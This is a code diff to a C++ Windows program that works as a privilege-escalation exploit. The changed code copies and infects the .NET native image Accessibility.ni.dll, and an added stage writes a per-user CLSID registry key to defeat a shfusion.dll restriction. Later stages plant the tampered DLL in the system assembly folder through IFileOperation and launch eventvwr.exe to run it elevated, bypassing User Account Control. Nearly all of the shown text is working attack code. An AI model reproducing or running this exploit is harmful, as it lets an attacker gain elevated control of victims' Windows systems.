@@ -3,6 +3,7 @@
 #include <ShObjIdl.h>
 #include <iostream>
 #include <string>
+#include <fstream>
 
 #pragma region NT Stuff
 typedef struct _UNICODE_STRING
@@ -142,8 +143,8 @@ int main()
 
 	WIN32_FIND_DATAW findData;
 	HANDLE findHandle;
-	tryagain:
-		findHandle = FindFirstFileW(fullPath.c_str(), &findData);
+tryagain:
+	findHandle = FindFirstFileW(fullPath.c_str(), &findData);
 	if (findHandle == INVALID_HANDLE_VALUE)
 	{
 		if (fullPath.find(L"\\assembly\\NativeImages_v4.0.30319_64\\Accessibility\\*.*") != std::string::npos)
@@ -187,14 +188,14 @@ int main()
 	  *	Copy the target dll, infect it and save it as "infect.dll"
 	  */
 
-	if (!CopyFileW(fullPath.c_str(), L"infect.dll", FALSE))
+	if (!CopyFileW(fullPath.c_str(), L"Accessibility.ni.dll", FALSE))
 	{
 		std::wcout << L"Failed to copy " << fullPath.c_str() << L" to the current directory. Error: " << GetLastError() << std::endl;
 		return EXIT_FAILURE;
 	}
 
-	const auto fileHandle = CreateFileW(L"infect.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
-	                                    FILE_ATTRIBUTE_NORMAL, nullptr);
+	const auto fileHandle = CreateFileW(L"Accessibility.ni.dll", FILE_READ_ACCESS | FILE_WRITE_ACCESS, 0, nullptr, OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL, nullptr);
 	if (fileHandle == INVALID_HANDLE_VALUE)
 	{
 		std::cout << "Failed to open 'infect.dll'. Error: " << GetLastError() << std::endl;
@@ -341,6 +342,53 @@ int main()
 
 	 /*
 	  *	STAGE 4
+	  *	Create a registry key that allows us to bypass the shfusion.dll restriction
+	  */
+
+	LSTATUS status;
+	DWORD openResult;
+	HKEY userKey;
+
+	if ((status = RegCreateKeyExW(
+		HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\CLSID\\{1D2680C9-0E2A-469d-B787-065558BC7D43}", 0, nullptr,
+		REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, nullptr, &userKey, &openResult)))
+	{
+		CoUninitialize();
+		std::cout << "RegOpenCurrentUser() failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
+	{
+		RegCloseKey(userKey);
+		CoUninitialize();
+		std::cout << "RegSetValueExW() (0) failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	if ((status = RegCreateKeyExW(userKey, L"Server", 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr,
+		&userKey,
+		&openResult)))
+	{
+		RegCloseKey(userKey);
+		CoUninitialize();
+		std::cout << "RegCreateKeyExW() failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+	if ((status = RegSetValueExW(userKey, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(L""), sizeof(L""))))
+	{
+		RegCloseKey(userKey);
+		CoUninitialize();
+		std::cout << "RegSetValueExW() (1) failed. Error " << status << std::endl;
+		return EXIT_FAILURE;
+	}
+
+	RegCloseKey(userKey);
+
+	/*
+	 *	END STAGE 4
+	 */
+
+	 /*
+	  *	STAGE 5
 	  *	Delete the original Accessibility.ni.dll file and move our inject.dll file with the correct name over there
 	  */
 
@@ -355,7 +403,7 @@ int main()
 		std::cout << "SHCreateItemFromParsingName() (0) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"Accessibility.ni.dll"));
+	fullPath = fullPath.substr(0, fullPath.size() - std::wcslen(L"\\Accessibility.ni.dll"));
 	result = SHCreateItemFromParsingName(fullPath.c_str(), nullptr, IID_IShellItem, reinterpret_cast<void**>(&targetFolder));
 	if (FAILED(result))
 	{
@@ -365,12 +413,12 @@ int main()
 		std::cout << "SHCreateItemFromParsingName() (1) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	
+
 	auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
-	auto currentDirectory = new WCHAR[requiredSize + 11];
+	auto currentDirectory = new WCHAR[requiredSize + 21];
 	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);
 
-	wcscat_s(currentDirectory, requiredSize + 11, L"\\infect.dll");
+	wcscat_s(currentDirectory, requiredSize + 21, L"\\Accessibility.ni.dll");
 	result = SHCreateItemFromParsingName(currentDirectory, nullptr, IID_IShellItem,
 		reinterpret_cast<void**>(&targetFile));
 	if (FAILED(result))
@@ -383,10 +431,19 @@ int main()
 		std::cout << "SHCreateItemFromParsingName() (2) failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-
-	delete[] currentDirectory;
-
-	result = fileOperation->RenameItem(existingFile, L"Accessibility.ni.dll.bak", nullptr);
+	
+	//result = fileOperation->RenameItem(targetFile, L"Accessibility.ni.dll", nullptr);
+	//if (FAILED(result))
+	//{
+	//	targetFile->Release();
+	//	targetFolder->Release();
+	//	existingFile->Release();
+	//	fileOperation->Release();
+	//	CoUninitialize();
+	//	std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+	//	return EXIT_FAILURE;
+	//}
+	result = fileOperation->CopyItem(targetFile, targetFolder, nullptr, nullptr);
 	if (FAILED(result))
 	{
 		targetFile->Release();
@@ -394,32 +451,9 @@ int main()
 		existingFile->Release();
 		fileOperation->Release();
 		CoUninitialize();
-		std::cout << "IFileOperation::DeleteItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
+		std::cout << "IFileOperation::CopyItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
 		return EXIT_FAILURE;
 	}
-	result = fileOperation->MoveItem(targetFile, targetFolder, L"Accessibility.ni.dll", nullptr);
-	if (FAILED(result))
-	{
-		targetFile->Release();
-		targetFolder->Release();
-		existingFile->Release();
-		fileOperation->Release();
-		CoUninitialize();
-		std::cout << "IFileOperation::MoveItem() failed. HRESULT: 0x" << std::hex << result << std::endl;
-		return EXIT_FAILURE;
-	}
-	result = fileOperation->SetOperationFlags(FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
-	if (FAILED(result))
-	{
-		targetFile->Release();
-		targetFolder->Release();
-		existingFile->Release();
-		fileOperation->Release();
-		CoUninitialize();
-		std::cout << "IFileOperation::SetOperationFlags() failed. HRESULT: 0x" << std::hex << result << std::endl;
-		return EXIT_FAILURE;
-	}
-
 	result = fileOperation->PerformOperations();
 	if (FAILED(result))
 	{
@@ -439,11 +473,11 @@ int main()
 	CoUninitialize();
 
 	/*
-	 *	END STAGE 4
+	 *	END STAGE 5
 	 */
 
 	 /*
-	  *	STAGE 5
+	  *	STAGE 6
 	  *	Launch Event Viewer via eventvwr.exe to execute the exploit and do the attack.
 	  */
 
@@ -454,7 +488,7 @@ int main()
 	}
 
 	/*
-	 *	END STAGE 5
+	 *	END STAGE 6
 	 */
 
 	 // Finally, we can print success and exit.
